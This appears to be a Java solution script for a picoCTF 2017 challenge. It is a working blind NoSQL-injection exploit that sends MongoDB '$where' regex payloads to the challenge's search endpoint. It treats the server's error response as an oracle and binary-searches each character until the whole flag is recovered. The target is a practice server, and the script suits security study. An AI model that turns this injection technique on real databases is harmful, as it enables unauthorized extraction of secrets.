import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;

public class Kaley
{
	public static URL web;
	public static boolean test(String flag) throws Exception
	{
		HttpURLConnection conn = (HttpURLConnection)web.openConnection();
		conn.setDoOutput(true);
		conn.setDoInput(true);
		conn.setUseCaches(false);
		conn.setRequestMethod("POST");
		conn.setRequestProperty("Content-Type", "application/json");
		conn.connect();
		
		OutputStream os = conn.getOutputStream();
		OutputStreamWriter osw = new OutputStreamWriter(os, "UTF-8");
		osw.write("{\"$where\": \"if (this.flag && /^flag{" + flag + "[A-Za-z0-9_]*}$/.test(this.flag)) throw 3\"}");
		osw.flush();
		osw.close();
		
		StringBuilder sb = new StringBuilder();
		BufferedReader br = new BufferedReader(new InputStreamReader( conn.getInputStream(),"utf-8"));
		String line = null;
		while ((line = br.readLine()) != null) {
		    sb.append(line + "\n");
		}
		br.close();
		return (sb.toString().equals("Error\n"));
	}
	
	public static char binarySearch(String before, char from, char to) throws Exception
	{
		while (from < to)
		{
			char mid = (char)((from + to) / 2);
			if (test(before + "[" + from + "-" + mid + "]"))
				to = mid;
			else
				from = (char)(mid + 1);
		}
		return to;
	}
	
	public static void main(String[] args) throws Exception
	{
		web = new URL("http://shell2017.picoctf.com:8080/search");
		
		String flag = "";
		for (int i = 0; i < 25; i++)
		{
			char res;
			if (test(flag + "[A-Z]"))
				res = binarySearch(flag, 'A', 'Z');
			else if (test(flag + "[0-9]"))
				res = binarySearch(flag, '0', '9');
			else if (test(flag + "[a-z]"))
				res = binarySearch(flag, 'a', 'z');
			else 
				res = '_';
			flag += res;
			System.out.print(res);
		}
		System.out.println();
		System.out.println("flag{" + flag + "}");
	}

}
